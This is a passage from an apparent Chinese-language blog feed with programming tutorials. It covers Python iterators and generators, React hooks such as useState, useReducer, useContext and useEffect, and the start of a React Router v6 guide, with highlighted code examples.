class="title function_">__iter__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.a = <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__next__</span>(<span class="params">self</span>):</span><br><span class="line">        x = <span class="variable language_">self</span>.a</span><br><span class="line">        <span class="variable language_">self</span>.a += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">myclass = MyNumbers()</span><br><span class="line">myiter = <span class="built_in">iter</span>(myclass)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(myiter))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(myiter))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成器</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">当在生成器函数中使用 yield 语句时，函数的执行将会暂停，并将 yield 后面的表达式作为当前迭代的值返回。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">然后，每次调用生成器的 next() 方法或使用 for 循环进行迭代时，函数会从上次暂停的地方继续执行，直到再次遇到 yield 语句。这样，生成器函数可以逐步产生值，而不需要一次性计算并返回所有结果。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">调用一个生成器函数，返回的是一个迭代器对象。</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">countdown</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">yield</span> n</span><br><span class="line">        n -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建生成器对象</span></span><br><span class="line">generator = countdown(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过迭代生成器获取值</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(generator))  <span class="comment"># 输出: 5</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(generator))  <span class="comment"># 输出: 4</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(generator))  <span class="comment"># 输出: 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 for 循环迭代生成器</span></span><br><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> generator:</span><br><span class="line">    <span class="built_in">print</span>(value)  <span class="comment"># 输出: 2 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># lambda arguments: expression</span></span><br><span class="line">x = <span class="keyword">lambda</span> a, b, c : a + b + c</span><br><span class="line"><span class="built_in">print</span>(x(<span class="number">5</span>, <span class="number">6</span>, <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">__name__属性</span></span><br><span class="line"><span class="string">一个模块被另一个程序第一次引入时，其主程序将运行。</span></span><br><span class="line"><span class="string">如果我们想在模块被引入时，模块中的某一程序块不执行，</span></span><br><span class="line"><span class="string">我们可以用__name__属性来使该程序块仅在该模块自身运行时执行。 </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># Filename: using_name.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&#x27;程序自身在运行&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&#x27;我来自另一模块&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 内置的函数 dir() 可以找到模块内定义的所有名称。以一个字符串列表的形式返回:</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python入门</tag>
      </tags>
  </entry>
  <entry>
    <title>react快速过知识点</title>
    <url>/posts/a27176ba/</url>
    <content><![CDATA[<h2 id="创建react项目"><a href="#创建react项目" class="headerlink" title="创建react项目"></a>创建react项目</h2><p>在终端输入<code>npx create-react-app xxx</code>创建一个react项目,通过<code>npm start</code>启动该项目.</p>
<h2 id="index-js"><a href="#index-js" class="headerlink" title="index.js"></a>index.js</h2><p><img src="https://image.zfxt.top/hexo-blog/react%E5%BF%AB%E9%80%9F%E8%BF%87%E7%9F%A5%E8%AF%86%E7%82%B9-2024-03-27-10-39-51.png" alt="react快速过知识点-2024-03-27-10-39-51"></p>
<p><code>StrickMode</code>是一个严格模式,它可以严格的进行功能审查</p>
<h2 id="组件方式"><a href="#组件方式" class="headerlink" title="组件方式"></a>组件方式</h2><ol>
<li>函数式组件<ul>
<li>JSX语法,将html+js融合的很深,他每个组件只能返回一个根元素.每个组件都需要正确的闭合</li>
<li>插值功能,通过<code>&#123;&#125;</code>来实现js的内容插入到html中.同样的html的标签可以直接作为值存储在js的类中.而不用在加上字符串符号.</li>
<li>因为每次都只能返回一个根元素,通常的做法是用<code>&lt;&gt;&lt;/&gt;</code>来进行闭合.当然有些元素需要传入key或者其他属性,这时候就可以使用react提供的<code>Fragment</code>来进行闭合</li>
<li>样式设置.他使用的是<code>className</code>来代替原来的<code>class</code><br>  <img src="https://image.zfxt.top/hexo-blog/react%E5%BF%AB%E9%80%9F%E8%BF%87%E7%9F%A5%E8%AF%86%E7%82%B9-2024-03-27-10-53-41.png" alt="react快速过知识点-2024-03-27-10-53-41"></li>
</ul>
</li>
<li>类组件</li>
</ol>
<h2 id="组件通信"><a href="#组件通信" class="headerlink" title="组件通信"></a>组件通信</h2><h3 id="通过props和解构的方式来实现组件间的通信"><a href="#通过props和解构的方式来实现组件间的通信" class="headerlink" title="通过props和解构的方式来实现组件间的通信"></a>通过props和解构的方式来实现组件间的通信</h3><p><strong>传值</strong><br><img src="https://image.zfxt.top/hexo-blog/react%E5%BF%AB%E9%80%9F%E8%BF%87%E7%9F%A5%E8%AF%86%E7%82%B9-2024-03-27-10-55-51.png" alt="react快速过知识点-2024-03-27-10-55-51"><br>他可以单个数据单个数据的传输,也可以直接传进来一个对象,然后再获取对象中的值,都是没问题的<br><strong>传递组件</strong><br>而且父组件也可以向子组件传递另一个组件,只要把这个组件放在对应的html中,他就可以正确的展示出来</p>
<p><strong>子组件传递给父组件</strong><br>这里简单讲就是</p>
<ol>
<li>状态提升,将该组件的属性提升到父组件中,然后通过传参的方式让子组件引用父组件的属性</li>
<li>自定义事件下传,再将修改这个属性的方法封装后传递给子组件,让子组件调用这个方法进行修改.</li>
</ol>
<h2 id="React的常用Hook"><a href="#React的常用Hook" class="headerlink" title="React的常用Hook"></a>React的常用Hook</h2><p><strong>useState</strong><br>最基础的状态管理</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 推断类型为 &quot;boolean&quot;</span></span><br><span class="line"><span class="keyword">const</span> [enabled, setEnabled] = <span class="title function_">useState</span>(<span class="literal">false</span>);</span><br></pre></td></tr></table></figure>

<p>enabled是状态值,而setEnabled是一个方法,他可以设置你的状态值</p>
<p><strong>useReducer</strong><br>他使用MVI的开发思路,将意图和状态分开,可以在<a href="https://zfxt.top/posts/c7f557a/?highlight=mvi">https://zfxt.top/posts/c7f557a/?highlight=mvi</a>查看关于MVI的相关属性.</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;useReducer&#125; <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">State</span> &#123;</span><br><span class="line">   <span class="attr">count</span>: <span class="built_in">number</span> </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">CounterAction</span> =</span><br><span class="line">  | &#123; <span class="attr">type</span>: <span class="string">&quot;reset&quot;</span> &#125;</span><br><span class="line">  | &#123; <span class="attr">type</span>: <span class="string">&quot;setCount&quot;</span>; <span class="attr">value</span>: <span class="title class_">State</span>[<span class="string">&quot;count&quot;</span>] &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="attr">initialState</span>: <span class="title class_">State</span> = &#123; <span class="attr">count</span>: <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">stateReducer</span>(<span class="params"><span class="attr">state</span>: <span class="title class_">State</span>, <span class="attr">action</span>: <span class="title class_">CounterAction</span></span>): <span class="title class_">State</span> &#123;</span><br><span class="line">  <span class="keyword">switch</span> (action.<span class="property">type</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;reset&quot;</span>:</span><br><span class="line">      <span class="keyword">return</span> initialState;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;setCount&quot;</span>:</span><br><span class="line">      <span class="keyword">return</span> &#123; ...state, <span class="attr">count</span>: action.<span class="property">value</span> &#125;;</span><br><span class="line">    <span class="attr">default</span>:</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;Unknown action&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> [state, dispatch] = <span class="title function_">useReducer</span>(stateReducer, initialState);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">addFive</span> = (<span class="params"></span>) =&gt; <span class="title function_">dispatch</span>(&#123; <span class="attr">type</span>: <span class="string">&quot;setCount&quot;</span>, <span class="attr">value</span>: state.<span class="property">count</span> + <span class="number">5</span> &#125;);</span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">reset</span> = (<span class="params"></span>) =&gt; <span class="title function_">dispatch</span>(&#123; <span class="attr">type</span>: <span class="string">&quot;reset&quot;</span> &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">h1</span>&gt;</span>欢迎来到我的计数器<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">p</span>&gt;</span>计数： &#123;state.count&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;addFive&#125;</span>&gt;</span>加 5<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;reset&#125;</span>&gt;</span>重置<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个钩子需要接受两个参数,第一个是接受到意图时,进入某个方法,判断意图并操作,第二个参数是初始状态.<br>然后使用这个dispatch方法时,需要传递对应的参数来判断需要进行什么操作.<br><strong>useContext</strong><br>这就是个全局隐式传递方法的函数,<br>我们一般传递属性都是通过props,显然的传递我们需要传递的对象,这样往往需要很多的操作,规定父子组件如何传递如何接受,<br>而使用useContext就可以进行隐式的接受,他是直接在ui树上进行传递的,也就是所有的子组件都可以获取.(包括递归的子组件)</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createContext, useContext &#125; <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">ThemeContext</span> = <span class="title function_">createContext</span>(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span> <span class="title function_">MyApp</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">ThemeContext.Provider</span> <span class="attr">value</span>=<span class="string">&quot;dark&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Form</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">ThemeContext.Provider</span>&gt;</span></span></span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Form</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">Panel</span> <span class="attr">title</span>=<span class="string">&quot;Welcome&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Button</span>&gt;</span>Sign up<span class="tag">&lt;/<span class="name">Button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Button</span>&gt;</span>Log in<span class="tag">&lt;/<span class="name">Button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">Panel</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Panel</span>(<span class="params">&#123; title, children &#125;</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> theme = <span class="title function_">useContext</span>(<span class="title class_">ThemeContext</span>);</span><br><span class="line">  <span class="keyword">const</span> className = <span class="string">&#x27;panel-&#x27;</span> + theme;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">section</span> <span class="attr">className</span>=<span class="string">&#123;className&#125;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;title&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      &#123;children&#125;</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">section</span>&gt;</span></span></span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Button</span>(<span class="params">&#123; children &#125;</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> theme = <span class="title function_">useContext</span>(<span class="title class_">ThemeContext</span>);</span><br><span class="line">  <span class="keyword">const</span> className = <span class="string">&#x27;button-&#x27;</span> + theme;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">className</span>=<span class="string">&#123;className&#125;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      &#123;children&#125;</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>他的步骤就是create,再provider,然后使用useContext获取.<br><strong>useMemo</strong><br>进行数据缓存的钩子,用来跳过代价昂贵的重新计算</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useMemo &#125; <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">TodoList</span>(<span class="params">&#123; todos, tab, theme &#125;</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> visibleTodos = <span class="title function_">useMemo</span>(<span class="function">() =&gt;</span> <span class="title function_">filterTodos</span>(todos, tab), [todos, tab]);</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>设置只有在某些数据变化时,他才会重新渲染,避免因为其他组建的渲染导致的重新计算<br><strong>useCollback</strong><br>与useMemo类似,但是他是缓存函数而不是数据<br><strong>useRef</strong><br><img src="https://image.zfxt.top/hexo-blog/react%E5%BF%AB%E9%80%9F%E8%BF%87%E7%9F%A5%E8%AF%86%E7%82%B9-2024-03-27-11-19-11.png" alt="react快速过知识点-2024-03-27-11-19-11"></p>
<ol>
<li>记录状态<br>他会记住你当前这个值的状态,并且他不会随着你对该元素的修改而重新渲染页面,也就是不会你的更新不会立刻展示在页面中.</li>
<li>获取dom<br>他的获取方式是<code>.current</code>来获取,他还可以直接获取dom元素的引用,或者其他的子组件,这样他可以直接调用这个原生dom的方法(例如获取input框,然后使用其对焦功能)或者子组件的方法(这样子要求,他才能调用子组件的方法.)<br> <img src="https://image.zfxt.top/hexo-blog/react%E5%BF%AB%E9%80%9F%E8%BF%87%E7%9F%A5%E8%AF%86%E7%82%B9-2024-03-27-11-25-04.png" alt="react快速过知识点-2024-03-27-11-25-04"></li>
</ol>
<p><strong>useEffect</strong><br>副作用函数</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">MyComponent</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 这里的代码会在每次渲染后执行</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 这里的代码只会在组件挂载后执行</span></span><br><span class="line">&#125;, []);</span><br><span class="line"></span><br><span class="line"><span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">//这里的代码只会在每次渲染后，并且 a 或 b 的值与上次渲染不一致时执行</span></span><br><span class="line">&#125;, [a, b]);</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> /&gt;</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>他的第二个参数,如果是空他就每次渲染都执行.就是监控值,每次修改这个监控值,都会导致他的Effect的调用,</p>
<p><strong>memo方法</strong><br>如果这个组件的props没有发生变化,他就不会进行重新渲染<br><img src="https://image.zfxt.top/hexo-blog/react%E5%BF%AB%E9%80%9F%E8%BF%87%E7%9F%A5%E8%AF%86%E7%82%B9-2024-03-27-11-33-53.png" alt="react快速过知识点-2024-03-27-11-33-53"><br>他通常与<code>useCallback</code>一起使用,这样子才能实现props的不发生变化(如果不缓存方法的话,他传递的props每次都会变更为一个新方法)</p>
]]></content>
      <tags>
        <tag>react</tag>
      </tags>
  </entry>
  <entry>
    <title>react router速成</title>
    <url>/posts/36012751/</url>
    <content><![CDATA[<h1 id="新版本（约定式书写）"><a href="#新版本（约定式书写）" class="headerlink" title="新版本（约定式书写）"></a>新版本（约定式书写）</h1><h2 id="导入包"><a href="#导入包" class="headerlink" title="导入包"></a>导入包</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// npm</span></span><br><span class="line">npm install react-router-dom@<span class="number">6</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// pnpm</span></span><br><span class="line">pnpm add react-router-dom@<span class="number">6</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// yarn</span></span><br><span class="line">yarn add react-router-dom@<span class="number">6</span></span><br></pre></td></tr></table></figure>

<p>在介绍 React Router 的概念以前，需要先区分两个概念：</p>
<p>react-router：为 React 应用提供了路由的核心功能；<br>react-router-dom：基于 react-router，加入了在浏览器运行环境下的一些功能。</p>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="BrowserRouter"><a href="#BrowserRouter" class="headerlink" title="BrowserRouter"></a>BrowserRouter</h3><p>要想在 React 应用中使用 React Router，就需要在 React 项目的根文件（index.tsx）中导入 Router 组件：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">StrictMode</span> &#125; <span class="keyword">from</span> <span class="string">&quot;react&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> <span class="title class_">ReactDOMClient</span> <span class="keyword">from</span> <span class="string">&quot;react-dom/client&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">BrowserRouter</span> &#125; <span class="keyword">from</span> <span class="string">&quot;react-router-dom&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&quot;./App&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> rootElement = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;root&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> root = <span class="title class_">ReactDOMClient</span>.<span class="title function_">createRoot</span>(rootElement);</span><br><span class="line"></span><br><span class="line">root.<span class="title function_">render</span>(</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">StrictMode</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">BrowserRouter</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">App</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">BrowserRouter</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">StrictMode</span>&gt;</span></span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p><code>BrowserRouter</code> 是最常用的路由方式，即浏览器路由。官方文档也建议将 <code>BrowserRouter</code> 组件用于 Web 应用程序。除了这种方式，<code>React Router</code> 还支持其他几种路由方式：</p>
<ul>
<li><code>HashRouter</code>：在路径前加入#成为一个哈希值，Hash 模式的好处是不会因为刷新页面而找不到对应路径；</li>
<li><code>MemoryRouter</code>：不存储 history，路由过程保存在内存中，适用于 React Native 这种非浏览器环境；</li>
<li><code>NativeRouter</code>：配合 React Native 使用，多用于移动端；</li>
<li><code>StaticRouter</code>：主要用于服务端渲染时。</li>
</ul>
<h3 id="Link"><a href="#Link" class="headerlink" title="Link"></a>Link</h3><p>Link 组件和 NavLink 组件的使用方式类似，例如在产品页面有一个返回首页的按钮，需要传递给 to 需要跳转的路径：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Link</span> &#125; <span class="keyword">from</span> <span class="string">&quot;react-router-dom&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./styles.css&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span> <span class="title function_">Product</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;product&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">Link</span> <span class="attr">to</span>=<span class="string">&quot;/&quot;</span>&gt;</span>返回首页<span class="tag">&lt;/<span class="name">Link</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果需要对 Link 进行更多控制，也可以传递给 to 一个对象，在这个对象中，可以通过 search 属性来添加查询字符串或通过 hash 属性来传递 hash值，例如：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Link</span> &#125; <span class="keyword">from</span> <span class="string">&quot;react-router-dom&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./styles.css&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span> <span class="title function_">Settings</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;settings&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello World<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">Link</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">to</span>=<span class="string">&#123;&#123;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">pathname:</span> &quot;/<span class="attr">settings</span>&quot;,</span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">search:</span> &quot;?<span class="attr">sort</span>=<span class="string">date</span>&quot;,</span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">hash:</span> &quot;#<span class="attr">hash</span>&quot;</span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          &#125;&#125;</span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        &gt;</span></span></span><br><span class="line"><span class="language-xml">          设置</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">Link</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Routes"><a href="#Routes" class="headerlink" title="Routes"></a>Routes</h3><p>下面来看看如何将路由映射为对应的页面（组件）。首先需要从 react-router-dom 中导入一个名为 <code>Routes</code> 的组件，它将包含可以在页面特定部分显示的所有不同的路由。</p>
<p>在 index.tsx 中进行如下修改：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">NavLink</span>, <span class="title class_">Routes</span>, <span class="title class_">Route</span> &#125; <span class="keyword">from</span> <span class="string">&quot;react-router-dom&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Product</span> <span class="keyword">from</span> <span class="string">&quot;./Product&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./styles.css&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;App&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello World<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">nav</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">NavLink</span> <span class="attr">to</span>=<span class="string">&quot;&quot;</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">NavLink</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">NavLink</span> <span class="attr">to</span>=<span class="string">&quot;product&quot;</span>&gt;</span>产品<span class="tag">&lt;/<span class="name">NavLink</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">NavLink</span> <span class="attr">to</span>=<span class="string">&quot;about&quot;</span>&gt;</span>关于<span class="tag">&lt;/<span class="name">NavLink</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Routes</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    </span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">Routes</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们需要在 Routes 组件中使用 Route 组件来定义所有路由。该组件接受两个 props：</p>
<p>path：页面 URL 应导航到的路径，类似于 NavLink 组件的 to；<br>element：页面导航到该路由时加载的元素。</p>
<p>Route 组件用于将应用的位置映射到不同的 React 组件。例如，当用户导航到 &#x2F;product 路径时呈现 Product 组件，可以这样来写：</p>
